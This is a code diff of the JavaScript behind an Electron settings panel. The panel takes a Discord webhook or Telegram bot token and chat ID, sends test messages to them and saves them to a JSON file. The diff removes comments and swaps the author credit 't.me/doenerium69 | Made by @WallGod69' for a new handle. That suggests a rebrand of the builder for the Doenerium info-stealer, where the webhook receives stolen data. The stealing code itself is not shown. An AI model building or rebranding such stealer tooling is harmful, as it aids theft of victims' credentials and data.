@@ -1,13 +1,11 @@
-// ## SIDEBAR SELECTOR ## //
-const sidebar = document.querySelector('.sidebar'); // setup sidebar
-const togglebtn = document.querySelector('.toggle-btn'); // setup toggle button
+const sidebar = document.querySelector('.sidebar');
+const togglebtn = document.querySelector('.toggle-btn'); 
 
-togglebtn.addEventListener('click', () => { // defining a page's active status (active or not)
-    sidebar.classList.toggle('active'); // set active
+togglebtn.addEventListener('click', () => {
+    sidebar.classList.toggle('active');
 });
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Select DOM elements
     const discordInput = document.getElementById('input1');
     const telegramTokenInput = document.getElementById('input2');
     const telegramChatIdInput = document.getElementById('input3');
@@ -15,7 +13,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const saveButton = document.querySelector('label[for="input-file"]');
     const helpButton = document.getElementById('helpButton');
 
-    // Function to send a test message to a Discord webhook
     async function sendTestEmbed(webhookURL) {
         const testEmbed = {
             title: '**Your Webhook Works Perfectly ✅**',
@@ -25,7 +22,7 @@ document.addEventListener('DOMContentLoaded', () => {
             },
             color: 0x303037,
             footer: {
-                text: 't.me/doenerium69 | Made by @WallGod69',
+                text: 't.me/vatfraudster | Made by @nodual',
             },
         };
 
@@ -43,7 +40,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Function to send a test message to a Telegram bot
     async function sendTestMessage(botToken, chatId) {
         const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         const testMessage = {
@@ -66,26 +62,22 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Function to validate the Discord webhook URL
     function isValidDiscordWebhookURL(url) {
         const regex = /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]{68}$/;
         return regex.test(url);
     }
 
-    // Function to validate the Telegram bot token
     function isValidTelegramBotToken(token) {
         const regex = /^\d{9,12}:[\w-]{35}$/;
         return regex.test(token);
     }
 
-    // Function to validate the Telegram chat ID | i just add for group
     function isValidTelegramChatID(chatID) {
     const regex = /^-?\d+$/;
     return regex.test(chatID);
     }
 
 
-    // Function to enable/disable text fields based on input
     function updateInputStates() {
         const discordText = discordInput.value.trim();
         const telegramTokenText = telegramTokenInput.value.trim();
@@ -115,33 +107,27 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Add event listeners to monitor changes in text fields
     discordInput.addEventListener('input', updateInputStates);
     telegramTokenInput.addEventListener('input', updateInputStates);
     telegramChatIdInput.addEventListener('input', updateInputStates);
-
-    // Function to store information in localStorage and JSON file
     function saveInfo() {
         const discordWebhookURL = discordInput.value.trim();
         const telegramBotToken = telegramTokenInput.value.trim();
         const telegramChatID = telegramChatIdInput.value.trim();
-
         if (discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL) || 
             (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID))) {
-            // Store in localStorage
             localStorage.setItem('discordWebhookURL', discordWebhookURL);
             localStorage.setItem('telegramBotToken', telegramBotToken);
             localStorage.setItem('telegramChatID', telegramChatID);
 
-            // Store in a JSON file
             const data = {
                 discordWebhookURL: discordWebhookURL,
                 telegramBotToken: telegramBotToken,
                 telegramChatID: telegramChatID
             };
 
-            const fs = require('fs'); // Ensure fs is required in the Electron context
-            const path = require('path'); // Ensure path is required in the Electron context
+            const fs = require('fs');
+            const path = require('path');
 
             fs.writeFile(path.join(__dirname, '..', 'info.json'), JSON.stringify(data, null, 2), (err) => {
                 if (err) {
@@ -185,11 +171,9 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Initialize input states on load
     updateInputStates();
 });
 
-// Function to open links based on clicked icon
 function openHelp(type) {
     const urls = {
         discord: 'https://youtu.be/fKksxz2Gdnc?si=T3rRJJ-pR5o74zG1',
@@ -203,10 +187,8 @@ function openHelp(type) {
     }
 }
 
-// Function to show a help message
 function showHelpMessage() {
     alert('Click on the question mark icons (?) next to each input field for more information.');
 }
 
-// Add an event listener for the help button
 document.getElementById('helpButton').addEventListener('click', showHelpMessage);
